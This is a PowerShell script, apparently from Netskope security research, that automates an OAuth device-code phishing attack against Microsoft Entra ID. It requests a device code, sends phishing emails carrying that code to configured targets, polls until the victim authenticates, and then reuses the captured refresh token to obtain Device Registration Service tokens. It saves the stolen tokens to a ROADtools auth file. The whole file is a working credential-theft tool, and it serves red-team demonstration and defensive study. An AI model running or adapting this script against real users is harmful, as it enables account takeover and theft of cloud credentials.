<#
____________________________________________________________________________________________________________________
Copyright 2021 Netskope, Inc.
Redistribution and use in source and binary forms, with or without modification, are permitted provided that the
following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following
disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following
disclaimer in the documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Written by Jenko Hwong
____________________________________________________________________________________________________________________

Acknowledgments:
    Dr. Nestori Syynimaa: https://o365blog.com/post/phishing
    Steve Borosh (rvrsh3ll), Bobby Cooke (boku7): https://github.com/rvrsh3ll/TokenTactics

#>

##################################################################################
# Command-line 
##################################################################################

param (
    [switch]$i  = $false, # -i: interactive
    [switch]$p  = $false, # -p: page output ala 'more'
    [switch]$v  = $false, # -v: verbose level 1
    [switch]$vv = $false, # -vv: verbose level 2
    [string]$to,          # -to: send to this email address
    [Parameter(Mandatory=$true)][string]$config
)

$CONF = Get-Content -Path $config | ConvertFrom-Json

if ($i)  { $CONF.interactive = $true }
if ($p)  { $CONF.page = $true }
if ($v)  { $CONF.verbose = 1 }
if ($vv) { $CONF.verbose = 2 }
# if ($to) { [string[]]$CONF.email.to = $to }

echo "$(Get-Date): Starting"

if ($CONF.verbose -ge 2) {
    echo ""
    echo "Configuration:"
    $CONF | ConvertTo-Json -Depth 20 
}

##################################################################################
# Globals
##################################################################################
$tenant_id = "victim_tenant_id"       # for demo purpose
$road_auth_file = ".roadtools_auth"

##################################################################################
# Create a body, we'll be using client id of "Microsoft Office"
# NOTE: Error: AADSTS90023: ClientId passed in the request doesn't match the one in cache
#       occurs if client_id is not consistent in step #0 vs step #2
##################################################################################

#-----------------------
# List of Client IDs
#-----------------------
$client_id_office     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
$client_label_office  = "Microsoft Office"
$client_id_az_cli     = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
$client_label_az_cli  = "Azure CLI"
$client_id_mab        = "29d9ed98-a469-4536-ade2-f981bc1d605e" 
$client_label_mab     = "Microsoft Authentication Broker"

#----------------------
# List of Resource IDs
#-----------------------
$resource_graph             = "https://graph.microsoft.com"
$recource_label_graph       = "MS Graph"
$resource_azure             = "https://management.azure.com"
$recource_label_auzre       = "Azure"
$resource_outlook           = "https://outlook.office365.com"
$resource_label_outlook     = "Outlook"
$resource_storage           = "https://storage.azure.com"
$resource_label_storage     = "Storage"
$resource_enrollment        = "https://enrollment.manage.microsoft.com"
$resource_label_enrollment  = "Enrollment Service"
$resource_drs               = "urn:ms-drs:enterpriseregistration.windows.net"
$resource_label_drs         = "Device Registration Service"
# $resource_storage         = "https://sajeh1.blob.core.windows.net"
# $resource_id_drs          = "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9"

#-----------------------
# Select Client IDs
#-----------------------
# $client1_id     = $client_id_office
# $client1_label  = $client_label_office
# $client1_id     = $client_id_az_cli
# $client1_label  = $client_label_az_cli
# $client1_id     = $client_id_mab
# $client1_label  = $client_label_mab
# $client2_id     = $client_id_mab
# $client2_label  = $client_label_mab

#-----------------------
# Select Resource IDs
#-----------------------
# $resource1        = $resource_graph
# $resource1_label  = $resource_label_graph
# $resource2        = $resource_azure
# $resource2_label  = $resource_label_azure
# $resource1        = $resource_enrollment
# $resource1_label  = $resource_label_enrollment
# $resource2        = $resource_drs
# $resource2_label  = $resource_label_drs

# Traditional OAuth Device Code Phish (FOCI)
#
if ($false) {
  $client1_id       = $client_id_office
  $client1_label    = $client_label_office
  $resource1        = $resource_graph
  $resource1_label  = $resource_label_graph

  $client2_id       = $client_id_office
  $client2_label    = $client_label_office
  # $client2_id     = $client_id_az_cli
  # $client2_label  = $client_label_az_cli
  $resource2        = $resource_azure
  $resource2_label  = $resource_label_azure
}

# MAB-PRT Abuse
#
if ($true) {
  $client1_id       = $client_id_mab
  $client1_label    = $client_label_mab
  $resource1        = $resource_enrollment
  $resource1_label  = $resource_label_enrollment

  $client2_id       = $client_id_mab
  $client2_label    = $client_label_mab
  $resource2        = $resource_drs
  $resource2_label  = $resource_label_drs
}
echo @"

##################################################################################
# 1.1. Get a new user code and device code 
#       client id: $client1_label
#       resource:  $resource1_label
##################################################################################
"@

$body=@{
	"client_id" = $client1_id
	"resource"  =  $resource1
}

# Invoke the request to get device and user codes
$authResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body

$user_code   = $authResponse.user_code
$device_code = $authResponse.device_code
$interval    = $authResponse.interval
$expires     = $authResponse.expires_in

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Request:"
    echo ""
    echo "POST https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
    echo $body | ConvertTo-Json -Depth 20
    echo ""
    echo "Response:"
    echo $authResponse
}

if ($CONF.send_email)  {

    if ($CONF.interactive) { Read-Host "Press [Enter] to send phish email(s)" }

    echo @"

##################################################################################
# 1.2. Send phish email
##################################################################################
"@

    foreach ($email_cfg in $CONF.email) {

      if ($to) { [string[]]$CONF.email.to = $to }
      # $verification_uri = $CONF.email.verification_uri
      $verification_uri = $email_cfg.verification_uri
      # $to_user = [string]::Join(',',$CONF.email.to)
      $to_user = [string]::Join(',',$email_cfg.to)

      if ($CONF.verbose -ge 1) {
          echo "       To:   $to_user"
          echo "       Code: $user_code"
          echo "       URL:  $verification_uri"
          echo ""
      }

      $smtp = new-object Net.Mail.SmtpClient($CONF.smtp.server, $CONF.smtp.port) 
      $smtp.Credentials = New-Object System.Net.NetworkCredential($CONF.smtp.username, $CONF.smtp.password); 
      $smtp.EnableSsl = $true 
      $smtp.Timeout = 400000  

      $Message = new-object Net.Mail.MailMessage 

      # $Message.Subject = $CONF.email.subject
      $Message.Subject = $email_cfg.subject
      # $Message.From = $CONF.email.from
      $Message.From = $email_cfg.from
      # foreach ($recip in $CONF.email.to) {
      foreach ($recip in $email_cfg.to) {
          $Message.To.Add($recip)
      }

      # $body_email = Get-Content -Path $CONF.email.body
      $body_email = Get-Content -Path $email_cfg.body
      $body_email = $body_email -replace '\${USER_CODE}', $user_code
      $body_email = $body_email -replace '\${VERIFICATION_URI}', $verification_uri
      $Message.Body = $body_email
      # $Message.IsBodyHTML = $CONF.email.body_html
      $Message.IsBodyHTML = $email_cfg.body_html

      if ($CONF.verbose -ge 2) {
          echo "### Message:"
          $Message | ConvertTo-Json -Depth 20
          echo "### End Message:"
      }

      $smtp.Send($Message)
    }

    # if ($CONF.interactive) { Read-Host "Press [Enter] to wait for user to authenticate" }

}

echo @"

##################################################################################
# 1.3. Waiting for user to authenticate...polling for oauth tokens
#       client id: $client1_label
#       resource:  $resource1_label
##################################################################################
"@

# Create body for authentication requests
$body=@{
	"client_id" =  $client1_id
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $device_code
	"resource" =   $resource1
}

$continue = $true

echo ""
echo "Request:"
echo ""
echo "POST https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0"
$body | ConvertTo-Json -Depth 20
echo ""

# Loop while authorization is pending or until timeout exceeded
while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Timeout occurred"
		return
	}
				
	# Try to get the response. Will give 40x while pending so we need to try&catch
	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# This is normal flow, always returns 40x unless successful
		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		# Write-Host $details.error
        Write-Host '.' -NoNewLine

		if(!$continue)
		{
			# Not pending so this is a real error
			Write-Error $details.error_description
			return
		}
	}

	# If we got response, all okay!
	if ($response) {
        echo ""
		break # Exit the loop
	}
}

# if ($CONF.interactive) { Read-Host "Press [Enter] to retrieve an oauth refresh token for initial enrollment" }


echo @"

##################################################################################
# 1.4. Retrieve oauth tokens (access + refresh)
#       client:   $client1_label
#       resource: $resource1_label
##################################################################################
"@

if ($CONF.verbose -ge 1) {
    echo ""
    echo "Response:"
    echo $response
}

$token = $response.access_token 
$token_secure = ConvertTo-SecureString $token -AsPlainText -Force 

if ($CONF.interactive) { Read-Host "Press [Enter] to get a new access token for the device registration service" }

echo @"

##################################################################################
# 1.5. Use refresh token to get new access token
#       client id:      $client2_label
#       resource:       $resource2_label
#       grant_type:     refresh_token
#       scope:          openid
##################################################################################
"@
#       refresh_token:  $response.refresh_token

$body=@{
    "client_id" =     $client2_id
    "grant_type" =    "refresh_token"
    "scope" =         "openid"
    "resource" =      $resource2
    "refresh_token" = $response.refresh_token
}
$drsResponse = Invoke-RestMethod -UseBasicParsing -Method POST -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

if ($CONF.verbose -ge 1) { 
    echo ""
    echo "Request:"
    echo ""
    echo "POST https://login.microsoftonline.com/Common/oauth2/token"
    $body | ConvertTo-Json -Depth 20
    echo ""
    echo "Response:"
    $drsResponse
}

$expires_in = $drsResponse.expires_in
$expires_on = $drsResponse.expires_on
$date_time = [datetime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc).AddSeconds($expires_on)
$expires_on_string = $date_time.ToString("yyyy-MM-dd HH:mm:ss")
$access_token = $drsResponse.access_token
$refresh_token = $drsResponse.refresh_token
$id_token = $drsResponse.id_token

$content = @"
{
  "tokenType": "Bearer",
  "expiresOn": "$expires_on_string",
  "tenantId": "$tenant_id",
  "_clientId": "$client2_id",
  "accessToken": "$access_token",
  "refreshToken": "$refresh_token",
  "idToken": "$id_token",
  "expiresIn": "$expires_in"
}
"@

$content | Out-File -FilePath $road_auth_file

##################################################################################
# End
##################################################################################

echo "$(Get-Date): Finished"
echo ""
